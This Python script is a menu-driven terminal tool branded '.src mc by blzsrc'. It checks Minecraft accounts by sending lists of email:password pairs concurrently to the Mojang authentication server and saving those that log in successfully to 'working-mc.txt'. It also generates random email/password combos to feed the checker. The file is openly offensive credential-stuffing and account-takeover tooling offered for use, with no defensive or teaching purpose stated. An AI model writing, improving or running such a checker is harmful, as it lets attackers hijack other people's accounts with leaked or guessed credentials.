import random
import string
import shutil
import os
import subprocess
import aiohttp  # Asynchronous HTTP library
import asyncio  # Asynchronous library
from time import sleep

# Set the terminal title to ".src mc by blzsrc"
print("\033]0;.src mc by blzsrc\007", end="", flush=True)

AUTH_URL = "https://authserver.mojang.com/authenticate"
RESET = "\033[0m"
GREEN = "\033[32m"
RED = "\033[31m"
COLORS = [
    "\033[38;5;57m",
    "\033[38;5;93m",
    "\033[38;5;129m",
    "\033[38;5;125m",
    "\033[38;5;161m",
    "\033[38;5;199m",
    "\033[38;5;201m",
]

ascii_art = """
    ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▄▄▄▄
█ █   ▐ █   █   █ █ █    ▌
   ▀▄   ▐  █▀▀█▀  ▐ █      
▀▄   █   ▄▀    █    █      
▄  █▀▀▀   █     █    ▄▀▄▄▄▄▀ 
 ▐      ▐     ▐   █     ▐  
                  ▐        
"""

def display_ascii_art():
    clear_console()
    center_ascii_art(ascii_art)

def clear_console():
    os.system("cls" if os.name == "nt" else "clear")

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return "".join(random.choice(characters) for _ in range(length))

def generate_email_and_password():
    domain = ["gmail.com", "yahoo.com", "hotmail.com"]
    email = f"{generate_random_string(8)}@{random.choice(domain)}"
    password = generate_random_string(12)
    return email, password

def apply_gradient_to_text(text):
    colored_text = ""
    for i, char in enumerate(text):
        colored_text += COLORS[i % len(COLORS)] + char
    return colored_text + RESET

def save_to_file(file_path, output_list):
    try:
        with open(file_path, "w") as file:
            for output in output_list:
                file.write(output + "\n")
        return file_path
    except IOError as e:
        print(f"{RED}Error saving to file: {e}{RESET}")

def open_file_location(file_path):
    try:
        if os.name == "nt":
            subprocess.Popen(f'explorer /select,"{file_path}"')
        elif os.name == "posix":
            subprocess.Popen(["xdg-open", file_path])
    except Exception as e:
        print(f"{RED}Error opening file location: {e}{RESET}")

def center_ascii_art(ascii_art):
    terminal_width = shutil.get_terminal_size().columns
    terminal_height = shutil.get_terminal_size().lines
    lines = ascii_art.strip().split("\n")
    art_height = len(lines)
    vertical_padding = max((terminal_height - art_height) // 3, 0)
    for _ in range(vertical_padding):
        print()
    for i, line in enumerate(lines):
        centered_line = line.center(terminal_width)
        color = COLORS[i % len(COLORS)]
        print(color + centered_line + RESET)

def display_gradient_menu():
    menu_options = [
        "1. Check Minecraft Accounts",
        "2. Generate Email and Password",
        "3. Exit",
    ]
    terminal_width = shutil.get_terminal_size().columns
    menu_height = len(menu_options) + 1
    vertical_padding = max((shutil.get_terminal_size().lines - menu_height) // 3, 0)
    for _ in range(vertical_padding):
        print()
    for i, option in enumerate(menu_options):
        color = COLORS[i % len(COLORS)]
        print(color + option.center(terminal_width) + RESET)
    separator_line = "=" * terminal_width
    print(apply_gradient_to_text(separator_line).center(terminal_width))

def display_status_and_menu(message=None):
    display_ascii_art()
    if message:
        terminal_width = shutil.get_terminal_size().columns
        print(f"{GREEN}{message.center(terminal_width)}{RESET}")
    display_gradient_menu()
    terminal_width = shutil.get_terminal_size().columns
    prompt = "[+] "
    padding = (terminal_width - len(prompt)) // 2
    gradient_prompt = apply_gradient_to_text(prompt)
    print(" " * padding + gradient_prompt, end="")

async def check_minecraft_account_async(email, password, session):
    payload = {
        "agent": {"name": "Minecraft", "version": 1},
        "username": email,
        "password": password,
    }
    try:
        async with session.post(AUTH_URL, json=payload) as response:
            if response.status == 200:
                return True
            else:
                return False
    except (aiohttp.ClientConnectorError, aiohttp.ClientResponseError):
        return False
    except Exception:
        return False

async def process_minecraft_accounts_async():
    unchecked_file_path = "unchecked-mc.txt"
    working_file_path = "working-mc.txt"
    try:
        with open(unchecked_file_path, "r") as unchecked_file:
            lines = unchecked_file.readlines()
        async with aiohttp.ClientSession() as session:
            tasks = []
            for line in lines:
                email, password = line.strip().split(":")
                tasks.append(asyncio.create_task(check_minecraft_account_async(email, password, session)))
            results = await asyncio.gather(*tasks)
            any_account_validated = False
            with open(working_file_path, "a") as working_file:
                for idx, valid in enumerate(results):
                    if valid:
                        email, password = lines[idx].strip().split(":")
                        working_file.write(f"{email}:{password}\n")
                        any_account_validated = True
            if any_account_validated:
                message = f"Accounts validated and saved to working-mc.txt"
                display_status_and_menu(message)
            else:
                message = "No valid accounts found"
                display_status_and_menu(message)
        open_file_location(working_file_path)
    except FileNotFoundError as e:
        display_status_and_menu(f"File not found: {e}")
    except IOError as e:
        display_status_and_menu(f"I/O error occurred while processing accounts: {e}")
    except Exception as e:
        display_status_and_menu(f"An unexpected error occurred: {e}")

def generate_email_and_password_to_file():
    quantity_prompt = (
        "How many email and password combinations would you like to generate?"
    )
    terminal_width = shutil.get_terminal_size().columns
    quantity_padding = (terminal_width - len(quantity_prompt)) // 2
    print(
        "\n" + " " * quantity_padding + apply_gradient_to_text(quantity_prompt), end=""
    )
    try:
        quantity = int(input().strip())
        if quantity < 1:
            display_status_and_menu("\nInvalid quantity. Please try again.")
            return
        unchecked_file_path = "unchecked-mc.txt"
        with open(unchecked_file_path, "a") as unchecked_file:
            for _ in range(quantity):
                email, password = generate_email_and_password()
                unchecked_file.write(f"{email}:{password}\n")
        display_status_and_menu(f"Email and password combinations saved to {unchecked_file_path}")
        open_file_location(unchecked_file_path)
    except ValueError:
        display_status_and_menu("\nInvalid quantity. Please try again.")
    except Exception as e:
        display_status_and_menu(f"An unexpected error occurred: {e}")

def display_menu():
    display_status_and_menu()
    while True:
        choice = input().strip()
        if choice == "1":
            asyncio.run(process_minecraft_accounts_async())
        elif choice == "2":
            generate_email_and_password_to_file()
        elif choice == "3":
            display_ascii_art()
            print("\nYou chose to exit. Goodbye!")
            break
        else:
            display_status_and_menu("\nInvalid choice. Please try again.")

if __name__ == '__main__':
    display_menu()
